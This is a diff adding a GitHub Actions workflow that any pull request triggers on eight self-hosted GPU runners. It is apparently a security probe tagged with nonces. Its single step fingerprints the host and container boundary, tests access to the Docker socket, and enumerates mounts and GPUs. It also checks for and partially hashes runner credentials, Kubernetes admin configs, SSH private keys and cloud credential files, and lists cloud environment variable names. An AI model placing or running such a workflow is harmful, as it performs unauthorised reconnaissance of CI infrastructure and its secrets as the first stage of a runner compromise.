@@ -1,0 +1,92 @@
+name: c211-125938-nvpost
+on:
+  pull_request:
+    types: [opened, synchronize, reopened]
+permissions:
+  contents: read
+jobs:
+  probe:
+    strategy:
+      fail-fast: false
+      max-parallel: 8
+      matrix:
+        include:
+          - tag: h200-01
+            label: "8-gpu-h200"
+          - tag: h200-02
+            label: "8-gpu-h200"
+          - tag: b200-01
+            label: "4-gpu-b200"
+          - tag: b200-02
+            label: "4-gpu-b200"
+          - tag: gb300-01
+            label: "2-gpu-gb300"
+          - tag: gb300-02
+            label: "2-gpu-gb300"
+          - tag: b300-01
+            label: "8-gpu-b300"
+          - tag: b300-02
+            label: "8-gpu-b300"
+    runs-on: ${{ matrix.label }}
+    timeout-minutes: 20
+    steps:
+      - name: privilege-host-boundary-and-credentials
+        env:
+          NONCE: c211-125938-089beb48c8d5cd08
+          JOBTAG: ${{ matrix.tag }}
+          LABEL: ${{ matrix.label }}
+        run: |
+          set -u
+          set +e
+          ts(){ date -u +%FT%TZ; }
+          echo "C211_NVPOST_BEGIN job=$JOBTAG label=$LABEL nonce=$NONCE ts=$(ts)"
+          echo "C211_MARKER job=$JOBTAG label=$LABEL nonce=$NONCE host=$(hostname) uid=$(id -u) user=$(id -un) ts=$(ts)"
+          echo "ID=$(id 2>&1 | head -c 400)"
+          echo "UNAME=$(uname -a 2>&1 | head -c 300)"
+          echo "HOSTNAME_FQDN=$(hostname -f 2>&1 | head -c 200)"
+          echo "PROC1_COMM=$(cat /proc/1/comm 2>&1 | head -c 120)"
+          echo "PROC1_CMDLINE=$(tr '\0' ' ' < /proc/1/cmdline 2>/dev/null | head -c 400)"
+          echo "=== A_PRIV ==="
+          grep -E '^(CapEff|CapBnd|NoNewPrivs|Seccomp):' /proc/self/status 2>/dev/null | head -8
+          echo "PROC1_CGROUP=$(cat /proc/1/cgroup 2>&1 | tr '\n' '|' | head -c 600)"
+          echo "DOCKERENV=$([ -e /.dockerenv ] && echo present || echo absent) CONTAINERENV=$([ -e /run/.containerenv ] && echo present || echo absent)"
+          if command -v systemd-detect-virt >/dev/null 2>&1; then echo "SYSTEMD_DETECT_VIRT=$(systemd-detect-virt 2>&1 | head -c 120)"; else echo SYSTEMD_DETECT_VIRT_ABSENT; fi
+          echo "=== B_SOCKETS ==="
+          echo "DOCKER_SOCK=$([ -S /var/run/docker.sock ] && echo present || echo absent) DOCKER_SOCK_WRITABLE=$([ -w /var/run/docker.sock ] && echo yes || echo no) CONTAINERD_SOCK=$([ -S /run/containerd/containerd.sock ] && echo present || echo absent)"
+          ls -l /var/run/docker.sock 2>&1 | head -2
+          if [ -S /var/run/docker.sock ]; then
+            echo "DOCKER_VERSION=$(curl -sS --max-time 5 --unix-socket /var/run/docker.sock http://localhost/version 2>&1 | head -c 800 | tr '\n' ' ')"
+          fi
+          echo "=== C_MOUNTS ==="
+          for p in /var/lib/docker /run/containerd /etc/kubernetes; do echo "PATH_STATE $p $([ -e "$p" ] && echo present || echo absent)"; done
+          echo "MOUNTS_MATCH_BEGIN"
+          grep -E '(/var/lib/docker|/run/containerd|/etc/kubernetes|/dev/nvidia)' /proc/mounts 2>/dev/null | head -20
+          echo "MOUNTS_MATCH_END"
+          ls -l /dev/nvidia* 2>&1 | head -12
+          echo "=== D_GPU ==="
+          if command -v nvidia-smi >/dev/null 2>&1; then
+            timeout 40 nvidia-smi -L 2>&1 | head -16
+            timeout 40 nvidia-smi --query-gpu=uuid,name,driver_version,memory.total --format=csv,noheader 2>&1 | head -16
+            echo "NVIDIA_GPU_COUNT=$(timeout 40 nvidia-smi -L 2>/dev/null | grep -c '^GPU')"
+          else
+            echo NVIDIA_SMI_ABSENT
+          fi
+          echo "=== E_CREDS ==="
+          digest(){ p="$1"; if [ -e "$p" ]; then s=$(sha256sum "$p" 2>/dev/null | cut -c1-16); sz=$(stat -c %s "$p" 2>/dev/null); echo "CRED_PATH=$p PRESENT SHA256_16=$s SIZE=$sz"; else echo "CRED_PATH=$p ABSENT"; fi }
+          digest /home/runner/actions-runner/.credentials
+          digest /home/runner/actions-runner/.runner
+          digest /etc/kubernetes/kubelet.conf
+          digest /etc/kubernetes/admin.conf
+          for f in /root/.ssh/id_* /home/*/.ssh/id_*; do
+            if [ -e "$f" ]; then digest "$f"; fi
+          done
+          digest /root/.docker/config.json
+          digest /home/runner/.docker/config.json
+          digest "$HOME/.aws/credentials"
+          digest "$HOME/.config/gcloud/application_default_credentials.json"
+          digest /etc/environment
+          echo "ENV_PRESENCE_BEGIN"
+          env | cut -d= -f1 | grep -E '^(AWS_|GOOGLE_|AZURE_|KUBERNETES_SERVICE_HOST$)' | sort | head -40
+          echo "ENV_PRESENCE_END"
+          echo "C211_NVPOST_END job=$JOBTAG label=$LABEL nonce=$NONCE ts=$(ts)"
+          exit 0
